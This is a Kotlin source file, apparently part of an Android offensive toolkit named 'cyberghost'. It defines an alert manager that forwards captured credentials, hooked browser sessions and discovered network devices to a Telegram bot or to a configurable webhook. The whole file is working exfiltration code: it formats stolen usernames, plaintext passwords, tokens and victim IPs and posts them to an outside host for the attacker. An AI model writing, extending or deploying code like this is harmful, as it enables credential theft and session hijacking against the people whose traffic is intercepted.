package com.cyberghost.core

import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.time.Instant

data class AlertConfig(
    var telegramEnabled: Boolean = false,
    var telegramBotToken: String = "",
    var telegramChatId: String = "",
    var webhookEnabled: Boolean = false,
    var webhookUrl: String = "",
    var alertOnCredential: Boolean = true,
    var alertOnHook: Boolean = true,
    var alertOnDevice: Boolean = false
)

class AlertManager {
    var config = AlertConfig()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun alertCredential(cred: HarvestedCredential) {
        if (!config.alertOnCredential) return
        val msg = buildString {
            appendLine("🔑 *CREDENTIAL CAPTURED*")
            appendLine("Host: `${cred.host}`")
            appendLine("Type: ${cred.type.name}")
            cred.username?.let { appendLine("User: `$it`") }
            cred.password?.let { appendLine("Pass: `$it`") }
            cred.token?.let { appendLine("Token: `${it.take(40)}`") }
            appendLine("IP: ${cred.sourceIp}")
            appendLine("Proto: ${cred.protocol}")
        }
        send(msg, mapOf(
            "type" to "credential",
            "host" to cred.host,
            "username" to (cred.username ?: ""),
            "password" to (cred.password ?: ""),
            "token" to (cred.token ?: ""),
            "sourceIp" to cred.sourceIp
        ))
    }

    fun alertHook(session: HookedSession, ip: String) {
        if (!config.alertOnHook) return
        val msg = buildString {
            appendLine("🪝 *BROWSER HOOKED*")
            appendLine("URL: `${session.pageUrl.take(60)}`")
            appendLine("IP: $ip")
            appendLine("Platform: ${session.platform}")
            appendLine("Screen: ${session.screenSize}")
            appendLine("Cookies: ${if (session.cookies.isNotEmpty()) "YES" else "none"}")
        }
        send(msg, mapOf(
            "type" to "hook",
            "url" to session.pageUrl,
            "ip" to ip,
            "platform" to session.platform
        ))
    }

    fun alertDevice(ip: String, mac: String, vendor: String) {
        if (!config.alertOnDevice) return
        val msg = "📱 *NEW DEVICE*\nIP: `$ip`\nMAC: $mac\nVendor: $vendor"
        send(msg, mapOf("type" to "device", "ip" to ip, "mac" to mac, "vendor" to vendor))
    }

    private fun send(message: String, payload: Map<String, Any>) {
        scope.launch {
            if (config.telegramEnabled && config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
                sendTelegram(message)
            }
            if (config.webhookEnabled && config.webhookUrl.isNotBlank()) {
                sendWebhook(payload)
            }
        }
    }

    private suspend fun sendTelegram(message: String) = withContext(Dispatchers.IO) {
        try {
            val url = URL("https://api.telegram.org/bot${config.telegramBotToken}/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = JSONObject().apply {
                put("chat_id", config.telegramChatId)
                put("text", message)
                put("parse_mode", "Markdown")
            }
            conn.outputStream.use { it.write(body.toString().toByteArray()) }
            val code = conn.responseCode
            if (code != 200) Log.e("CG2", "Telegram send failed: $code")
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("CG2", "Telegram error: ${e.message}")
        }
    }

    private suspend fun sendWebhook(payload: Map<String, Any>) = withContext(Dispatchers.IO) {
        try {
            val url = URL(config.webhookUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val json = JSONObject(payload).toString()
            conn.outputStream.use { it.write(json.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("CG2", "Webhook error: ${e.message}")
        }
    }

    fun stop() { scope.cancel() }
}
